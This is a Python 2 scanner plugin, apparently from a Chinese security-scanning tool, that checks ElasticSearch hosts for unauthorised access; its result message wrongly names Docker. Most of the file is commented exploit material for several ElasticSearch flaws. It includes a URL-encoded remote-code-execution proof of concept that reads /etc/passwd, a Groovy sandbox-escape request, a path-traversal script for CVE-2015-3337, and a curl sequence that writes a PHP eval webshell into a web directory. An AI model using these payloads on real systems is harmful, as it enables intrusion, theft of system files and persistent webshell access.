# coding:utf-8
import socket
import requests
import Config


def get_plugin_info():
    plugin_info = {
        "name": "ElasticSearch漏洞",
        "info": "远程命令执行（cve-2014-3120),任意命令执行，未授权访问,任意文件读取",
        "exp_url": "https://blog.csdn.net/u011066706/article/details/51175761",
        "docker": "",
        "other": ""
    }
    return plugin_info


def check(ip, port, timeout):
    try:
        url = "http://"+ip+":" + port
        res = requests.get(url+"/_cat",timeout)
        if res.status_code == 200:
            return u"%s 存在Docker 未授权访问漏洞" % url
    except Exception, e:
        pass


#
# ElasticSearch远程命令执行(CVE-2014-3120)
# 漏洞介绍：
#
# ElasticSearch有脚本执行(scripting)的功能，可以很方便地对查询出来的数据再加工处理。ElasticSearch用的脚本引擎是MVEL，这个引擎没有做任何的防护，或者沙盒包装，所以直接可以执行任意代码。
#
# 而在ElasticSearch 1.2之前的版本中，默认配置是打开动态脚本功能的，如果用户没有更改默认配置文件，攻击者可以直接通过http请求执行任意代码。
#
# 测试POC：
#
# http://127.0.0.1:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22%2Fetc%2Fhosts%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fhosts%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%2C%22%2Fetc%2Fpasswd%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D&callback=jQuery111107529820275958627_1400564696673&_=1400564696674
#
# Elasticsearch Groovy任意命令执行漏洞
# 影响版本为1.3.0-1.3.7以及1.4.0-1.4。漏洞原因是elasticsearch使用groovy作为脚本语言，虽然加入了沙盒进行控制，危险的代码会被拦截，但是由于沙盒限制的不严格，通过黑白名单来判断，导致可以绕过，实现远程代码执行。
#
# 代码格式如下：
#
# POST http://127.0.0.1:9200/_search?pretty HTTP/1.1
# User-Agent: es
# Host: 127.0.0.1:9200
# Content-Length: 132
#
# {
# "size":1,
#     "script_fields": {
#         "lupin": {
#             "script": "java.lang.Math.class.forName(\“java.lang.Runtime\”)"
#         }
#     }
# }
#
# 向_search?pretty页面发送一段json脚本，script替换成绕过沙箱的攻击脚本，可以实现任意命令执行。
#
# 漏洞利用工具：elasticsearch利用工具
#
#
#
# Elasticsearch未授权访问
# elasticsearch在安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。http://localhost:9200/_cat/indices里面的indices包含了_river一般就是安装了river了。
#
# picture from wooyun
#
#
#
# http://localhost:9200/_rvier/_search就可以查看敏感信息了
#
#
#
#
#
# Elasticsearch任意文件读取漏洞
# 原来代码是
#
# if (!Files.exists(file) || Files.isHidden(file))
# 补丁后
#
# if (!Files.exists(file) || Files.isHidden(file) || !file.toAbsolutePath().normalize().startsWith(siteFile.toAbsolutePath()))
# 说明原来这里有漏洞，最后代码会进入
#
#  try {
#             byte[] data = Files.readAllBytes(file);
#             channel.sendResponse(new BytesRestResponse(OK, guessMimeType(sitePath), data));
#         } catch (IOException e) {
#             channel.sendResponse(new BytesRestResponse(INTERNAL_SERVER_ERROR));
#         }
#
# 会读取文件的内容，造成任意文件读取。
#
# 利用exp
#
# #!/usr/bin/env python
# #-*- coding:utf-8 -*-
#
# import requests
#
# def elastic_directoryTraversal(host,port):
# 	pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk', 'head']
# 	pList = ['/../../../../../../../../../../../../../../etc/passwd','/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd','/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini']
#  	for p in pluginList:
#  		for path in pList:
#  			urlA = "http://%s:%d/_plugin/%s%s" % (host,port,p,path)
#  			try:
#  				content = requests.get(urlA,timeout=5,allow_redirects=True,verify=False).content
#  				if "/root:/" in content:
#  					print 'Elasticsearch 任意文件读取漏洞(CVE-2015-3337) Found!'
#  			except Exception,e:
#  				print e
#
# elastic_directoryTraversal(host,port)
#
# elasticsearch Snapshot 写php shell
# 在PHP环境下利用：
#
# curl -XDELETE http://localhost:9200/test.php
#
# curl -XDELETE http://localhost:9200/_snapshot/test.php
#
# curl -XPOST http://localhost:9200/test.php/test.php/1 -d'
# {"<?php eval($_POST[chr(97)]);?>":"test"}'
#
# curl http://localhost:9200/test.php/_search?pretty
#
# curl -XPUT 'http://localhost:9200/_snapshot/test.php' -d '{
#      "type": "fs",
#      "settings": {
#           "location": "/data/httpd/htdocs/default",
#           "compress": false
#      }
# }'
#
# curl -XPUT "http://localhost:9200/_snapshot/test.php/test.php" -d '{
#      "indices": "test.php",
#      "ignore_unavailable": "true",
#      "include_global_state": false
# }'
#
# 需要知道web目录location
#
